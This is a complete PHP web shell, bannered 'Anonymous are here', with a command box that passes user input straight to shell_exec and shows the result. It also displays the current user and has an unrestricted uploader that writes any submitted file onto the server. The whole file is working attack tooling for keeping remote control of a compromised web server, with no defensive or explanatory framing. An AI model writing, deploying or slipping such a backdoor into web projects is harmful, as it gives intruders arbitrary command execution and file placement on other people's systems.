<?php
  $header1 = 'Anonymous are here';
  $header2 = 'A simple command php shell';
  $insert = $_POST['cmd'];
  $result = shell_exec($insert);
  $currentuser = shell_exec('whoami');
?>

<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>Base64 encoded shell</title>
    <style media="screen">
    body {
      background-color: #000;
      color: grey;
    }
    form {
      border: 2px solid #8a4d21;
      border-radius: 5px;
      padding: 20px;
    }
    input:not([type='submit']) {
      color: grey;
      margin-bottom: 10px;

    }
    input[type='submit'] {
      cursor: pointer;
    }
    input[type='submit']:hover {
      box-shadow: 0px 0px 10px 1px #3ac126;
    }
      textarea {
        margin-left: auto;
        margin-right: auto;
        resize: none;
        padding: 5px;
        max-width: 620px;
        font-size: 1.5em;
        background-color: aquamarine;
        overflow: auto;
        border-radius: 10px;
        min-height: 50vh;
        min-width: 50vw;
      }
      .container {
        max-width: 1000px;
        margin-left: auto;
        margin-right: auto;
      }
      .big {
        font-size: 1.3em;
      }
      .red {
        color: red;
      }
    </style>
  </head>
  <body>

     <h1 style='text-align:center;color: #0c796a'><?= $header1 ?></h1>
     <h2 style='text-align:center;color: #0c796a'><?= $header2 ?></h2>
     <hr>
     <div class="container">
       <?php
           echo 'Uploader:<br>';
           echo '<br>';
           echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
           echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form><br><br>';
           if( $_POST['_upl'] == "Upload" ) {
             if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) {
               echo '<b>Upload !!!</b><br><br>';
                 } else {
                   echo '<b>Upload !!!</b><br><br>';
                 }} ?>
                 Command execution:<br><br>
       <form action="" method="post" style='margin:auto'>
         <p class="big"><?='Current user: ' . '<span class=\'red\'>' . $currentuser . '</span>';?></p>
         Insert shell command. Ex: 'ls' (for <a href="https://www.hostinger.com/tutorials/linux-commands">Linux</a>) or 'dir' (for <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/windows-commands">Windows</a>):<br>

         <input type="text" name="cmd" placeholder="Command to execute.." required><br>
         <input type="submit" name="submit" value="Execute">
         <br><br>
         Result:<br>
         <textarea name="result" cols="90" readonly><?= $result; ?></textarea>
       </form>
     </div>
  </body>
</html>
